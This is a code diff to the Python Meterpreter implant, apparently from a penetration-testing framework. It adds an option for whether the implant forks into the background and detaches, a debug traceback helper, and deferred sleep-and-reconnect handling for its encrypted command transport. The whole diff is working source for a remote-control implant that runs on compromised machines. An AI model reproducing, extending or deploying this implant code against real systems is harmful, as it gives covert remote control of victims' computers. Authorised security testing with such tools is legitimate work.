@@ -60,6 +60,7 @@ random.seed()
 
 # these values will be patched, DO NOT CHANGE THEM
 DEBUGGING = False
+TRY_TO_FORK = True
 HTTP_CONNECTION_URL = None
 HTTP_PROXY = None
 HTTP_USER_AGENT = None
@@ -237,6 +238,13 @@ def crc16(data):
 def debug_print(msg):
 	if DEBUGGING:
 		print(msg)
+
+@export
+def debug_traceback(msg=None):
+	if DEBUGGING:
+		if msg:
+			print(msg)
+		traceback.print_exc(file=sys.stderr)
 
 @export
 def error_result(exception=None):
@@ -533,6 +541,7 @@ class Transport(object):
 		try:
 			pkt = self.decrypt_packet(self._get_packet())
 		except:
+			debug_traceback()
 			return None
 		if pkt is None:
 			return None
@@ -554,6 +563,7 @@ class Transport(object):
 		try:
 			self._send_packet(self.encrypt_packet(pkt))
 		except:
+			debug_traceback()
 			return False
 		self.communication_last = time.time()
 		return True
@@ -709,7 +719,7 @@ class TcpTransport(Transport):
 		first = self._first_packet
 		self._first_packet = False
 		if not select.select([self.socket], [], [], 0.5)[0]:
-			return ''
+			return bytes()
 		packet = self.socket.recv(PACKET_HEADER_SIZE)
 		if packet == '':  # remote is closed
 			self.request_retire = True
@@ -755,6 +765,7 @@ class TcpTransport(Transport):
 class PythonMeterpreter(object):
 	def __init__(self, transport):
 		self.transport = transport
+		self._transport_sleep = None
 		self.running = False
 		self.last_registered_extension = None
 		self.extension_functions = {}
@@ -859,6 +870,12 @@ class PythonMeterpreter(object):
 				response = self.create_response(request)
 				if response:
 					self.send_packet(response)
+				if self._transport_sleep:
+					self.transport.deactivate()
+					time.sleep(self._transport_sleep)
+					self._transport_sleep = None
+					if not self.transport.activate():
+						self.transport_change()
 				continue
 			# iterate over the keys because self.channels could be modified if one is closed
 			channel_ids = list(self.channels.keys())
@@ -1086,11 +1103,8 @@ class PythonMeterpreter(object):
 		seconds = packet_get_tlv(request, TLV_TYPE_TRANS_COMM_TIMEOUT)['value']
 		self.send_packet(tlv_pack_response(ERROR_SUCCESS, response))
 		if seconds:
-			self.transport.deactivate()
-			time.sleep(seconds)
-			if not self.transport.activate():
-				self.transport_change()
-		return None
+			self._transport_sleep = seconds
+		return ERROR_SUCCESS, response
 
 	def _core_channel_open(self, request, response):
 		channel_type = packet_get_tlv(request, TLV_TYPE_CHANNEL_TYPE)
@@ -1209,9 +1223,7 @@ class PythonMeterpreter(object):
 					return
 				result, resp = result
 			except Exception:
-				debug_print('[-] method ' + handler_name + ' resulted in an error')
-				if DEBUGGING:
-					traceback.print_exc(file=sys.stderr)
+				debug_traceback('[-] method ' + handler_name + ' resulted in an error')
 				result = error_result()
 			else:
 				if result != ERROR_SUCCESS:
@@ -1226,7 +1238,8 @@ class PythonMeterpreter(object):
 		resp += tlv_pack(reqid_tlv)
 		return tlv_pack_response(result, resp)
 
-if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
+_try_to_fork = TRY_TO_FORK and hasattr(os, 'fork')
+if not _try_to_fork or (_try_to_fork and os.fork() == 0):
 	if hasattr(os, 'setsid'):
 		try:
 			os.setsid()
